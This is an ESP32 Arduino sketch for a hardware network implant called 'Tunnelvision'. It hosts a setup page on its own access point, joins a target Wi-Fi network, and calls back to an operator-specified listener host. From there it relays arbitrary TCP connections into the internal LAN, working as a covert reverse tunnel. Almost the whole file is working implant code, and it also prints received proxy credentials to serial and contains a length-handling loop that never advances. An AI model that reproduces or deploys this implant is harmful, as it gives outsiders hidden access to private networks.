#include <WiFi.h>
#include <Arduino.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <FreeRTOS.h>
#include  <freertos/task.h>
#include <esp_task.h>
#include <lwip/sockets.h>
#include <lwip/err.h>
#include <lwip/sys.h>
#include <netdb.h>
#include <ESPmDNS.h>
#include <fcntl.h>

#define ESP32_SSID "Tunnelvision ☭"
#define ESP32_KEY "133742069"
#define ESP32_DOMAIN "tunnelvision"

String html = 
  "<!DOCTYPE html>"
  "<html>"
  "<head>"
  "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">"
  " <title>UKERN's Tunnelvision</title>"
  " <style>*{background: #000; color: #149414;} html,body{font-family:'Courier New';}</style>"
  "</head>"
  "<body>"
  " <center>"
  "   <h1>UKERN's Tunnelvision</h1>"
  "   <h2>Setup</h2>"
  "   <form>"
  "   <b>SSID: </b><input required name=\"SSID\" type=\"text\"/><br/>"
  "   <b>KEY: </b><input name=\"KEY\" type=\"text\" minlength=\"8\"/><br/>"
  "   <b>HOST: </b><input required name=\"HOST\" type=\"text\" maxlength=\"253\"/><br/>"
  "   <b>PORT: </b><input required name=\"PORT\" type=\"number\"/><br/>"
  "   <input name=\"submit\" type=\"submit\" value=\"connect\">"
  "  </form>"
  " </body>"
  "</html>";

WiFiServer server(80);
const char* ssid = NULL;
const char* password = NULL;
const char* listenHost = NULL;
uint16_t listenPort = 0;

typedef uint8_t ProxyPacketType;
const ProxyPacketType  PROXYPACKET_NOP = 0x00,
PROXYPACKET_AUTH = 0xA0,
PROXYPACKET_AUTHFAIL = 0xAF,
PROXYPACKET_DATA = 0xD0,
PROXYPACKET_ENDRESPONSE = 0xDE;

typedef struct  ProxyPacketHeader {
  ProxyPacketType packetType;
} __packed ProxyPacketHeader_t ;

typedef struct ProxyPacketAuth {
  const char loginName[256];
  const char loginPassword[256];
} __packed ProxyPacketAuth_t;

typedef struct ProxyPacket {
  uint32_t packetLength;
  char domain[253];
  uint16_t port;
} __packed ProxyPacket_t;

int createIPv4Socket(const char *domain, uint16_t port) {

  int fd = -1;
  struct sockaddr_in sa = {};
  struct hostent* ent = NULL;
  char IPv4Address[INET_ADDRSTRLEN];

  if( !(ent = gethostbyname(domain)) ) {
    Serial.println("FAIL_RESOLVE_DNS");
    return -1;
  }
  
  if(ent->h_addrtype != AF_INET) {
    Serial.println("IPV6_UNSUPPORTED");
    return -1;
  }

  bcopy((struct sockaddr_in *) ent->h_addr_list[0], &sa.sin_addr, sizeof(struct sockaddr_in));
  inet_ntop(AF_INET, &(sa.sin_addr.s_addr), IPv4Address, INET_ADDRSTRLEN);
  
  sa.sin_family = AF_INET;
  sa.sin_port = htons(port);

  fd = socket(AF_INET, SOCK_STREAM, 0);
  if(fd < 0) {
    Serial.println("FAIL_SOCK_CREATE");
    return -1;
  }

  struct timeval tv;

  tv.tv_sec = 30;  /* 30 Secs Timeout */
  setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO,(struct timeval *)&tv,sizeof(struct timeval));

  /* Connect to the server */
  int attempt = 0;
  while (true) {
    Serial.println("CONN_TCP");
    if( connect(fd, (struct sockaddr*)&sa, sizeof(sa)) < 0 ) {
      Serial.print("FAIL_CONN_TCP: ");
      Serial.println(domain);
      attempt++;
      if(attempt < 3) {
        continue;
      }
      else {
        Serial.print("FAIL_CONN_TCP_MAXRETRIES");
        close(fd);
        return -1;
      }
    }
    break;
  }

  return fd;
}

int receiveProxyAuthPacket(int sock) {

  ProxyPacketAuth_t auth = {};
  ssize_t nRead = read(sock, &auth, sizeof(ProxyPacketAuth_t));

  Serial.println(auth.loginName);
  Serial.println(auth.loginPassword);

  switch(nRead) {
    case -1:
      Serial.println("PROXY_AUTH_RECV_FAIL");
      return -1;
    case 0:
      Serial.println("PROXY_AUTH_NODATA");
      return 0;
    
    default:
      if(nRead != sizeof(ProxyPacketAuth_t)) {
        Serial.println("PROXY_AUTH_INVALID");
        return -1;
      }
      break;
  } 
  return nRead;
}

int receiveProxyDataPacket(int sock) {
  ProxyPacket_t proxyPacket = {};
  ssize_t nRead = read(sock, &proxyPacket, sizeof(ProxyPacket_t));

  Serial.println(nRead);

  if(nRead == -1) {
    Serial.println("Failed reading.");
    return -1;
  }
  else if (nRead == 0) {
    Serial.println("Read nothing");
    return 0;
  }
  else if(nRead != sizeof(ProxyPacket_t)) {
    Serial.println("Invalid proxypacket.");
    return -1;
  }

  Serial.println("CONN_TARGET");
  int targetSock = createIPv4Socket(proxyPacket.domain, proxyPacket.port);
  if(targetSock < 0) {
    Serial.println("FAIL_CONN_TARGET");
    return -1;
  }

  char buffer[256];
  if(proxyPacket.packetLength) {

    // Read small chunk
    if(proxyPacket.packetLength < 256) {
      char buffer[proxyPacket.packetLength];
      nRead = read(sock, buffer, proxyPacket.packetLength);
      write(targetSock, buffer, nRead);
      
    }
    else {
      // Read large chunks
      int len = proxyPacket.packetLength;
      while(len > 0) {
        if(len >= 256) {
          nRead = read(sock, buffer, 256);
          write(targetSock, buffer, nRead);
        }
        else {
          nRead = read(sock, buffer, len);
          write(targetSock, buffer, len);
          len = 0;
        }
      }
    }
    bzero(buffer, 256);

    ProxyPacketHeader_t hdr = {};
    hdr.packetType = PROXYPACKET_DATA;

    ProxyPacket_t responsePacket = {};
    responsePacket.packetLength = 256;
    responsePacket.port = proxyPacket.port;
    memcpy(responsePacket.domain, proxyPacket.domain, sizeof(responsePacket.domain));

    while( (nRead = read(targetSock, buffer, 256)) > 0)
    {
      Serial.printf("RECV %d bytes...\n", nRead);
      responsePacket.packetLength = nRead;
      write(sock, &hdr, sizeof(ProxyPacketHeader_t));
      write(sock, &responsePacket, sizeof(ProxyPacket_t));
      write(sock, buffer, responsePacket.packetLength);
      bzero(buffer, 256);
    }

    hdr.packetType = PROXYPACKET_ENDRESPONSE;
    write(sock, &hdr, sizeof(ProxyPacketHeader_t));
  }

  if(targetSock >= 0) {
    close(targetSock);
  }
    
  return nRead;
}

int8_t receiveProxyPacket(int sock) {
  
  ProxyPacketHeader_t hdr = {};
  ssize_t nRead = read(sock, &hdr, sizeof(ProxyPacketHeader_t));

  switch(nRead) {
    case -1:
      return -1;
    case 0:
      return 0;
    
    default:
      if(nRead != sizeof(ProxyPacketHeader_t)) {
        return -1;
      }
      break;
  } 

  switch(hdr.packetType) {

    case PROXYPACKET_NOP:
    Serial.println("RECV_NOP");
      break;

    case PROXYPACKET_AUTH:
      nRead = receiveProxyAuthPacket(sock);
      Serial.println("RECV_AUTH");
      break;

    case PROXYPACKET_DATA:
      nRead = receiveProxyDataPacket(sock);
      Serial.println("RECV_DATA");
      break;

    default:
      Serial.printf("RECV_INVALID, type=%d", hdr.packetType);
      break;
  }
  return nRead;
}


void runTCPLANImplant(const char* listenerDomain, uint16_t listenerPort)
{
  int listenerSock = -1;

  Serial.println("CONN_LISTENER");
  listenerSock = createIPv4Socket(listenerDomain, listenerPort);
  if(listenerSock < 0) {
    return;
  }

  Serial.println("RECV_FROM_LISTENER");
  while(true) {
    const int8_t rc = receiveProxyPacket(listenerSock);
    if(rc == -1 || rc == 0) {
      close(listenerSock);
      return;
    }
  }
}

void setup() {

  // Start serial
  while(!Serial){}
  Serial.begin(9600);


  // Initialize Wi-Fi accesspoint
  Serial.println("INIT_AP.");
  WiFi.softAP(ESP32_SSID, ESP32_KEY);
  
  // Retrieve ESP's gateway IP
  IPAddress ESP32_IP = WiFi.softAPIP();
  Serial.print("IP: ");
  Serial.println(ESP32_IP);
  
  // Start the HTTP server
  server.begin();

  // Try to setup mDNS name
  bool MDNSStatus = MDNS.begin(ESP32_DOMAIN);
  if (MDNSStatus) {
    MDNS.addService("http", "tcp", 80);
    Serial.print("DOMAIN: ");
    Serial.println(ESP32_DOMAIN);
  }
}

/* finds the needle in the haystack and returns it */
String midString(String str, String start, String finish){
  int locStart = str.indexOf(start);
  if (locStart==-1) return "";
  locStart += start.length();
  int locFinish = str.indexOf(finish, locStart);
  if (locFinish==-1) return "";
  return str.substring(locStart, locFinish);
}

void loop() {

  // Wait for available clients
  WiFiClient client = server.available();

  if(client)
  {
    
    // Receive data from client
    Serial.println("WEBSRV_CLIENT: "+client.remoteIP().toString());
    String request = client.readStringUntil('\r');
    String response = "";

    // Print out the request
    Serial.println(request);

    // Write HTTP header to client
    client.println("HTTP/1.1 200 OK");
    client.println("Content-type: text/html");
    client.println("Connection: close");
    client.println("Server: UKERN-TUNNELVISION v1.0");
    client.println();


    /* 
      Parse the response from the client
    */
    if(request.indexOf("SSID=") != -1) {
      ssid = strdup(midString(request, "SSID=", "&").c_str());
      response += "<b>SSID_OK</b><br/>";
    }
    if(request.indexOf("KEY=") != -1) {
      password = strdup(midString(request, "KEY=", "&").c_str());
      response += "<b>KEY_OK</b><br/>";
    }
    if(request.indexOf("HOST=") != -1) {
      listenHost = strdup(midString(request, "HOST=", "&").c_str());
      response += "<b>HOST_OK</b><br/>";
    }
    if(request.indexOf("PORT=") != -1) {
      char *_port = strdup(midString(request, "PORT=", "&").c_str());
      listenPort = (uint16_t)atoi(_port);
      response += "<b>PORT_OK</b><br/>";
    }

    if(listenPort && listenHost && ssid){
      response += "<b>SETUP_COMPLETE</b><br/>";
    }

    client.print(html+response);

    if(ssid != NULL && listenHost != NULL && listenPort != 0) {
      Serial.print("WNET ");
      Serial.print(ssid);
      Serial.print(" FORWARD TO ");
      Serial.print(listenHost);
      Serial.print(":");
      Serial.println(listenPort);
      WiFi.begin(ssid, password);
      int count = 0;
      while(WiFi.status() != WL_CONNECTED)
      {
        delay(500);
        Serial.print("WLAN_CONN_RETRY");
        count++;
        if(count == 10)
        {
          Serial.print("MAX_RETRY_EXCEEDED");
          ssid = NULL;
          password = NULL;
          listenPort = 0;
          listenHost = NULL;
          return;
        }
      }
      Serial.println("WLAN_CONNECTED");
      Serial.print("IP: ");
      Serial.print(WiFi.localIP());
      Serial.print(" MAC: ");
      Serial.println(WiFi.BSSIDstr());

      runTCPLANImplant(listenHost, listenPort);

    }
    request="";
    response = "";
  }
}